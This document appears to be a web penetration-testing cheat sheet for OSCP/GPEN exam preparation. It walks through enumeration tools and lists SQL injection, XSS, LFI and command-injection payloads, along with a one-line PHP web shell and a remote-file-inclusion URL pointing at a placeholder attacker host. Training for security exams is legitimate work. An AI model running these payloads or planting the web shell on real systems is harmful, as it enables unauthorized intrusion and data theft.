# Web Application Enumeration & Penetration Testing Cheat Sheet (OSCP / GPEN)

This cheat sheet provides a **structured workflow for web application enumeration and penetration testing** commonly used in **OSCP and GPEN exams**.

Core methodology:

```
Discover → Fingerprint → Enumerate → Test → Exploit
```

Web exploitation is **90% enumeration**. Careful observation of the application usually reveals the attack surface.

---

# 1. Identify Web Server

Check HTTP response:

```bash
curl -I http://TARGET
```

Example output:

```
Server: Apache/2.4.29
X-Powered-By: PHP/7.2
```

---

# 2. Identify Web Technologies

Use automated fingerprinting tools:

```bash
whatweb http://TARGET
```

Alternative:

```bash
wappalyzer
```

Identify:

```
web server
programming language
framework
CMS
libraries
```

---

# 3. Check Robots.txt

```bash
curl http://TARGET/robots.txt
```

Look for hidden directories.

Example:

```
Disallow: /admin
Disallow: /backup
```

---

# 4. Check Sitemap

```bash
curl http://TARGET/sitemap.xml
```

May reveal hidden endpoints.

---

# 5. Directory Enumeration

Use Gobuster:

```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
```

Alternative:

```bash
dirsearch -u http://TARGET
```

Common wordlists:

```
common.txt
directory-list-2.3-medium.txt
raft-medium-directories.txt
```

---

# 6. File Enumeration

Search for sensitive files:

```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip
```

Common file extensions:

```
php
asp
aspx
bak
old
zip
tar
log
```

---

# 7. Virtual Host Enumeration

Check for virtual hosts:

```bash
ffuf -u http://TARGET -H "Host: FUZZ.domain.com" -w subdomains.txt
```

---

# 8. Subdomain Enumeration

Passive:

```bash
sublist3r -d domain.com
```

Active:

```bash
amass enum -d domain.com
```

---

# 9. HTTP Methods

Check allowed methods:

```bash
curl -X OPTIONS http://TARGET
```

Look for:

```
PUT
DELETE
TRACE
```

---

# 10. Inspect Web Source Code

Always inspect source:

```
CTRL+U
```

Look for:

```
API endpoints
comments
hidden paths
credentials
```

---

# 11. Identify Parameters

Look for input points:

```
GET parameters
POST parameters
cookies
headers
```

Example:

```
http://target/page.php?id=1
```

---

# 12. SQL Injection Testing

Test for SQL injection:

```
'
"
1' OR '1'='1
```

Use SQLMap:

```bash
sqlmap -u "http://TARGET/page.php?id=1" --dbs
```

Dump tables:

```bash
sqlmap -u "http://TARGET/page.php?id=1" --dump
```

---

# 13. Cross-Site Scripting (XSS)

Test payload:

```
<script>alert(1)</script>
```

Other payloads:

```
"><script>alert(1)</script>
```

Types:

```
Reflected XSS
Stored XSS
DOM-based XSS
```

---

# 14. File Upload Vulnerabilities

Upload test file:

```
shell.php
```

Basic web shell:

```php
<?php system($_GET['cmd']); ?>
```

Execute:

```
http://TARGET/uploads/shell.php?cmd=id
```

---

# 15. Local File Inclusion (LFI)

Test parameters:

```
?page=
?file=
?include=
```

Payload:

```
../../../../etc/passwd
```

Example:

```
http://TARGET/index.php?page=../../../../etc/passwd
```

---

# 16. Remote File Inclusion (RFI)

Test remote inclusion:

```
http://attacker/shell.txt
```

Example:

```
http://TARGET/index.php?page=http://ATTACKER/shell.txt
```

---

# 17. Command Injection

Test parameters:

```
; id
&& id
| id
```

Example:

```
127.0.0.1; id
```

---

# 18. Directory Traversal

Payload:

```
../../../../etc/passwd
```

URL encoded:

```
..%2f..%2f..%2fetc/passwd
```

---

# 19. Authentication Testing

Check login functionality:

```
default credentials
weak passwords
logic flaws
```

Common defaults:

```
admin:admin
admin:password
root:root
```

---

# 20. Session Management

Inspect cookies:

```
session IDs
authentication tokens
```

Check for:

```
session fixation
session reuse
```

---

# 21. Password Reset Functionality

Test:

```
password reset tokens
email manipulation
IDOR
```

---

# 22. IDOR (Insecure Direct Object Reference)

Test changing object IDs:

```
/profile?id=1001
/profile?id=1002
```

---

# 23. CSRF Testing

Check for CSRF protection.

Test by creating malicious form.

---

# 24. API Enumeration

Check API endpoints:

```
/api/
/v1/
/v2/
```

Test with:

```bash
curl http://TARGET/api/users
```

---

# 25. Hidden Parameters

Use fuzzing:

```bash
ffuf -u http://TARGET/page.php?FUZZ=value -w parameters.txt
```

---

# 26. HTTP Headers

Inspect headers:

```bash
curl -I http://TARGET
```

Look for:

```
X-Powered-By
Server
cookies
```

---

# 27. Backup Files

Check for backups:

```
backup.zip
site.tar.gz
config.bak
```

---

# 28. Sensitive Files

Common files:

```
.git
.env
config.php
database.yml
```

---

# 29. Git Repository Exposure

Check:

```
http://TARGET/.git
```

Download repository:

```bash
git-dumper http://TARGET/.git
```

---

# 30. Web Shell Access

Common shells:

```
php-reverse-shell
simple PHP web shell
```

Example:

```php
<?php system($_GET['cmd']); ?>
```

---

# 31. Automated Scanners

Useful tools:

```
nikto
wpscan
sqlmap
ffuf
dirsearch
gobuster
```

Example:

```bash
nikto -h http://TARGET
```

---

# 32. Important Enumeration Workflow

```
1. Identify web server
2. Discover directories
3. Inspect source code
4. Identify parameters
5. Test injection points
6. Check authentication logic
7. Search for sensitive files
8. Attempt exploitation
```

---

# 33. Common Exam Vulnerabilities

Typical OSCP/GPEN web vulnerabilities:

```
SQL injection
LFI
Command injection
File upload
Weak authentication
Exposed backups
```

---

# 34. Quick Command Reference

Directory enumeration:

```bash
gobuster dir -u http://TARGET -w wordlist.txt
```

SQL injection:

```bash
sqlmap -u "http://TARGET/page.php?id=1" --dbs
```

Web scanning:

```bash
nikto -h http://TARGET
```

---

# 35. Final Advice

Web exploitation is primarily **observational**.

Always ask:

```
What input does the application accept?
How is user input processed?
Can I manipulate it?
```

Careful enumeration almost always leads to vulnerabilities.
